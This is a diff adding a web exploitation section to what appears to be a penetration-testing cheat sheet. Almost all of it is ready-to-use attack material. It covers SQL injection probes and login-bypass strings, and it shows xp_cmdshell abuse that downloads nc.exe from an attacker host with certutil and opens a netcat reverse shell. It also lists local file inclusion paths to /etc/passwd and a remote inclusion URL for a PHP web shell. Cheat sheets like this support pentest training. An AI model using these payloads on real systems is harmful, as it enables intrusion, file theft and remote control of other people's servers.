@@ -248,4 +248,46 @@ Enumeration
      `snmpwalk -c public -v2c <RHOST>`
      `snmp-check <RHOST>`
 
+<br><br>
 
+Web Exploitation
+===============================================================================================
+`SQL Injection`
+
+-    SQLMap  
+     `sqlmap -r <burp_file>`
+     
+-    Test for SQLI  
+         
+         '
+         '-- -
+         ASCII(97)
+         ' or 1=1--
+         '; waitfor delay ('0:0:20)'--
+         wfuzz -u http://<RHOST>/FUZZ -w /usr/share/seclists/Fuzzing/special-chars.txt
+     
+-    Login Bypass  
+
+         admin' --
+         admin' -- -
+         admin'-
+         admin' #
+         admin'/*
+         admin' or 1=1--
+         admin' or 1=1#
+         admin' or 1=1/*
+         admin') or '1'='1--
+         admin') or ('1'='1--
+    
+-    Abuse Command Shell  
+
+         ' EXEC sp_configure 'xp_cmdshell', 1--
+         ' reconfigure--
+         ' EXEC xp_cmdshell 'certutil -urlcache -f http://<LHOST>:<LPORT>/nc.exe nc.exe'--
+         ' EXEC xp_cmdshell "nc.exe -e cmd.exe <LHOST> <LPORT>";--
+         
+`LFI/RFI`
+     
+         ../../../../../../../../etc/passwd
+         c:\windows\system32\drivers\etc\hosts
+         http://<LHOST:80>/p0wny_shell.php
